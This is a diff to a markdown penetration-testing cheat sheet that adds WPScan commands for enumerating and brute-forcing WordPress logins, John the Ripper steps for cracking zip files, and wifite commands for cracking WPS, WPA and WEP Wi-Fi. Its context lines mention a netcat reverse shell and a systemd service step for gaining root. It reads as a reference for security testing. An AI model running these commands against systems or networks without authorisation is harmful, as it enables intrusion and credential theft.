@@ -12,7 +12,7 @@ Once payload is triggered netcat will open a reverse shell:
 
 ![netcat_injecttest](_netcat_injecttest.jpg)
 
-## Create service
+### Create service
 
 Create 0xfab1.service in /temp/
 
@@ -41,13 +41,26 @@ Now use systemctl on victim machine and we should be root from the attacker box:
 /bin/systemctl start fab
 ```
 
+## Web
+
+### Wordpress
+
+[WPScan](https://github.com/wpscanteam/wpscan) is a WordPress security scanner to test the security of their WordPress websites.
+
+Example
+
+``` sh
+wpscan --url http://example.org/wordpress -e u
+wpscan --url http://example.org/wordpress --usernames admin --passwords wordlist.txt --threads 10
+```
+
 ## Passwords
 
 - Crunch: create custom wordlists
 
 ### John the ripper
 
-John the Ripper is a tool for offline password cracking
+[John the Ripper](https://github.com/openwall/john) is a tool for offline password cracking. If you prefer a GUI there is one available [here](https://github.com/openwall/johnny).
 
 Crack keyfile PW
 
@@ -63,6 +76,13 @@ Convert a JWT to a format John the Ripper can understand with [jwt2john](https:/
 wget --quiet -O /usr/local/bin/jwt2john.py "https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py"
 sed -i '1s;^;#!/usr/bin/env python\n;' /usr/local/bin/jwt2john.py
 chmod +x /usr/local/bin/jwt2john.py
+```
+
+Crack a password protected zip file:
+
+``` sh
+zip2john filename.zip > filename.hash
+john filename.hash --wordlist=wordlist.txt --verbosity=5
 ```
 
 ### Hydra
@@ -188,12 +208,25 @@ aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b [bssid] -h 00:11:22:33:44:66 [dev
 aircrack-ng -n 128 -b [bssid] [filename]-01.cap
 ```
 
+### WiFite2
+
+[wifite2](https://github.com/kimocoder/wifite2) is a tool to audit WEP or WPA encrypted wireless networks. It uses aircrack-ng, pyrit, reaver, tshark tools to perform the audit.
+
+Examples:
+
+- Cracking WPS PIN (Pixie-Dust with Reaver to get PIN and Bully to get PSK): ```wifite -e ESSID```
+- Cracking WPA key using PMKID attack: ```wifite -e ESSID --pmkid```
+- Decloaking & cracking a hidden access point on channel 10 using the WPA Handshake attack: ```wifite -c 10```
+- Cracking a weak WEP password using the WEP Replay attack: ```wifite --wep```
+- Cracking a pre-captured handshake using John The Ripper: ```wifite --crack```
+- Cracking a 5Ghz WiFi (skipping WPS, PMKID to save time) using a given dictionary: ```sudo wifite --kill --no-wps --no-pmkid --5ghz --dict wordlist.txt```
+
 ### Kismet
 
 Config [Kismet](https://www.kismetwireless.net)
 
-- Config this file```/usr/local/etc/kismet.conf```
-- And add a sourece e.g.```source=ipw2200,eth1,Intel```
+- Config this file ```/usr/local/etc/kismet.conf```
+- And add a sourece e.g. ```source=ipw2200,eth1,Intel```
 
 Commands
 
